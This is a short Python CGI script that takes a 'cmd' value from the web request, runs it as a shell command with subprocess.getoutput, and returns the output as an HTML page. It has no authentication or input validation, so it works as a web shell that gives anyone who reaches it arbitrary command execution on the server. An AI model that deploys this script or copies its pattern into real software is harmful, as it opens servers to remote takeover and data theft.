#!/usr/bin/python3

import subprocess
import cgi

print("Content-type: text/html")
print()

mydata = cgi.FieldStorage()

cmd = mydata.getvalue("cmd")

output = subprocess.getoutput(cmd)
print("<div align='center'><br /><br /><br />")
print("<pre><h1>")
print(output)
print("</pre></h1>")
print("</div>")
